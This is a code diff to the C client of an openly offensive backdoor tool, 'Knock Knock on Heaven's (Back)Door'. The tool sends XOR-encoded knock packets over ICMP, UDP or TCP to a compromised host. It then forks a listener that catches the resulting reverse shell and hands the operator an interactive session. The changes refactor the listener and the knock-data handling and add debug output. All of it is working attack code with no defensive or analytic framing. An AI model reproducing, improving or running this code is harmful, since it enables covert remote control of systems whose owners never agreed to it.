@@ -129,28 +129,27 @@ void listener(int port) {
 		printf("%s Listening on port %d...\n", good, port);
 	}
 
-	while(1) {
-		sin_size = sizeof(struct sockaddr_in);
-		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
+	sin_size = sizeof(struct sockaddr_in);
+	new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
 	
-		if(new_sockfd == -1) fatal("accepting connection");
+	if(new_sockfd == -1) fatal("accepting connection");
 
-		printf("%s Connection from %s:%d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+	printf("%s Connection from %s:%d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 		
-		rec = read(new_sockfd, buff, 256);
+	rec = read(new_sockfd, buff, 256);
 
-		if(checkshell(new_sockfd) == -1) {
-			fatal("reverse shell not opened");
-		} else {
-			printf(" Shell is opened!\n\n");
-		}
-
-		if(rec > 0) fprintf(stdout, "%s", buff); 
-	
-        	send(new_sockfd, INIT, strlen(INIT), 0);
-		shell(new_sockfd);
-		shutdown(new_sockfd, SHUT_RDWR);
+	if(checkshell(new_sockfd) == -1) {
+		fatal("reverse shell not opened");
+	} else {
+		printf(" Shell is opened!\n\n");
 	}
+
+	if(rec > 0) fprintf(stdout, "%s", buff); 
+	
+        send(new_sockfd, INIT, strlen(INIT), 0);
+	shell(new_sockfd);
+	shutdown(new_sockfd, SHUT_RDWR);
+	close(sockfd);
 }
 
 void s_xor(char *arg, int key, int nbytes) {
@@ -331,7 +330,7 @@ void tcp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, c
 }
 
 void usage(char *argv){
-	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
+	printf("\n\e[01;36mKnock Knock on Heaven's (Back)Door\e[00m\n");
 	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n");
 	printf("\nUsage: %s <args>\n\n", argv);
 	printf("-x\tProtocol (ICMP/UDP/TCP)\n");
@@ -350,11 +349,11 @@ void usage(char *argv){
 
 int main(int argc, char **argv) {
 	pid_t pid;
-        char *srcip, *dstip, *data, *prot, *reverse_port;
+        char *srcip, *dstip, *data, *buf, *prot, *reverse_port;
         int opt, l = 0;
         unsigned int srcport = 0, dstport = 0;
 
-        srcip = dstip = prot = NULL;
+        srcip = dstip = prot = buf = NULL;
  
         while((opt = getopt(argc, argv, "s:t:p:q:x:d:l")) != EOF) {
                 switch(opt) {
@@ -421,82 +420,91 @@ int main(int argc, char **argv) {
 	}
 
 	system("clear");
-	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
+	printf("\n\e[01;36mKnock Knock on Heaven's (Back)Door\e[00m\n");
 	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");
 	printf("\e[01;31mKnock knock Neo...\e[00m\n\n");
 
         if(!strcmp(prot, "icmp")) {
                 printf("%s Knocking with ICMP protocol\n", good);
-		
+		printf("%s Data: %s\n", good, data);
+
 		if(l){
+			buf = strdup(data);
+			s_xor(data, 11, strlen(data));
+			printf("%s Encoded data: %s\n", good, data);
+			reverse_port = strtok(buf, " ");
+			reverse_port = strtok(NULL, " ");
+			reverse_port = strtok(NULL, " ");
+			
 			pid = fork();
 	
 			if(pid == -1) fatal("on forking proccess");
 
-			if(pid > 0) {
-				reverse_port = strtok(data, " ");
-				reverse_port = strtok(NULL, " ");
-				reverse_port = strtok(NULL, " ");
-				listener(atoi(reverse_port));
-			}
+			if(pid > 0) listener(atoi(reverse_port));
 
 			if(pid == 0){
-				s_xor(data, 11, strlen(data));
 				usleep(100*1500);
 				icmp(srcip, dstip, data);
 			}
 		} else {
 			s_xor(data, 11, strlen(data));
+			printf("%s Data: %s\n", good, data);
 			icmp(srcip, dstip, data);
 			printf("\n");
 		}
         } else if(!strcmp(prot, "udp")) {
                 printf("%s Knocking with UDP protocol\n", good);
+		printf("%s Data: %s\n", good, data);
 	
 		if(l){
+			buf = strdup(data);
+			s_xor(data, 11, strlen(data));
+			printf("%s Encoded data: %s\n", good, data);
+			reverse_port = strtok(buf, " ");
+			reverse_port = strtok(NULL, " ");
+			reverse_port = strtok(NULL, " ");
+			
 			pid = fork();
 
 			if(pid == -1) fatal("on forking proccess");
 
-			if(pid > 0) {
-				reverse_port = strtok(data, " ");
-				reverse_port = strtok(NULL, " ");
-				reverse_port = strtok(NULL, " ");
-				listener(atoi(reverse_port));
-			}
+			if(pid > 0) listener(atoi(reverse_port));
 
 			if(pid == 0){
-				s_xor(data, 11, strlen(data));
 				usleep(100*1500);
                 		udp(srcip, dstip, srcport, dstport, data);
 			}
 		} else {
 			s_xor(data, 11, strlen(data));
+			printf("%s Data: %s\n", good, data);
                 	udp(srcip, dstip, srcport, dstport, data);
 			printf("\n");
 		}
         } else if(!strcmp(prot, "tcp")) {
                 printf("%s Knocking with TCP protocol\n", good);
+		printf("%s Data: %s\n", good, data);
 	
 		if(l){
+			buf = strdup(data);
+			s_xor(data, 11, strlen(data));
+			printf("%s Encoded data: %s\n", good, data);
+			reverse_port = strtok(buf, " ");
+			reverse_port = strtok(NULL, " ");
+			reverse_port = strtok(NULL, " ");
+			
 			pid = fork();
 
 			if(pid == -1) fatal("on forking proccess");
 
-			if(pid > 0) {
-				reverse_port = strtok(data, " ");
-				reverse_port = strtok(NULL, " ");
-				reverse_port = strtok(NULL, " ");
-				listener(atoi(reverse_port));
-			}
+			if(pid > 0) listener(atoi(reverse_port));
 
 			if(pid == 0){
-				s_xor(data, 11, strlen(data));
 				usleep(100*1500);
                 		tcp(srcip, dstip, srcport, dstport, data);
 			}
 		} else {
 			s_xor(data, 11, strlen(data));
+			printf("%s Data: %s\n", good, data);
                 	tcp(srcip, dstip, srcport, dstport, data);
 			printf("\n");
 		}
